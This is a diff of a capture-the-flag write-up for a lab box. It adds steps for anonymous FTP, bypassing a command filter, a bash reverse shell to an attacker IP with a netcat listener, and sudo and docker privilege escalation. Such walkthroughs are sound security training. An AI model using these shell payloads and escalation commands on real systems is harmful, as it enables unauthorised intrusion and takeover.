@@ -43,12 +43,19 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 * FTP Anonymous login is permitted i.e. Login to FTP server with `anonymous` username and no password is allowed.
-*
+* FTP has only one file:`note.txt`<br>
+![Screenshot](./assets/2.png)<br>
 
+* Contents of `note.txt`:
 ```
 Anurodh told me that there is some filtering on strings being put in the command -- Apaar
 ```
+* `anurodh` and `apaar` usernames are noted for later use.
+* The website view of main page:<br>
+![Screenshot](./assets/1.png)
 
+* Used `gobuster` to scan to find any other hidden directories on the website:
+* **Gobuster Scan Results:**
 ```
 =====================================================
 /.hta (Status: 403)
@@ -65,14 +72,32 @@ Anurodh told me that there is some filtering on strings being put in the command
 2022/07/30 19:12:47 Finished
 =====================================================
 ```
-https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+* `/secret` directory of the website:<br>
+![Screenshot](./assets/3.png)
+* Basic commands like `ls` or `cat` can't be executed:<br>
+![Screenshot](./assets/4.png)
+* But, `id` command was executed successfully:<br>
+![Screenshot](./assets/5.png)
+* Searched for some bash reverse shell payloads from <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>.
+* But `bash -i >& /dev/tcp/10.4.50.128/7777 0>&1` can't be used.<br>
+![Screenshot](./assets/4.png)
+* Using `/bin/bash` instead of `bash` works.
 
 ## Exploitation/Gaining Access:
 
-`bash -i >& /dev/tcp/10.4.50.128/7777 0>&1`
-`/bin/bash -c '/bin/bash -i >& /dev/tcp/10.4.50.128/7777 0>&1'`
-`nc -lnvp 7777`
-`sudo -u apaar /home/apaar/.helpline.sh`
+* Finally this payload worked properly:`/bin/bash -c '/bin/bash -i >& /dev/tcp/10.4.50.128/7777 0>&1'`, with a netcat listener:`nc -lnvp 7777`<br>
+![Screenshot](./assets/6.png)
+* Next, some basic enumeration in the home directory:<br>
+![Screenshot](./assets/7.png)
+* Sudo commands that can be run by `www-data` user:<br>
+![Screenshot](./assets/8.png)
+* Hence the following command can be used to run `.helpline.sh` as `apaar` user:`sudo -u apaar /home/apaar/.helpline.sh`. Now, since the above code directly passes the given input and runs the command without parsing, giving `/bin/bash` as input will spawn a shell with `apaar` user privileges.
+![Screenshot](./assets/9.png)<br>
+* The file `local.txt` in `apaar` user's home directory is the required user flag.<br>
+![Screenshot](./assets/10.png)
+
+## Post Exploitation
+
 `netstat -anlp | grep LISTEN`
 `ssh -i id_rsa apaar@10.10.175.103 -L 9001:127.0.0.1:9001`
 
@@ -87,7 +112,6 @@ uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
 ```
 `docker run --rm -it --privileged -v /:/mnt alpine`
 
-## Post Exploitation
 
 ## Privilege Escalation
 
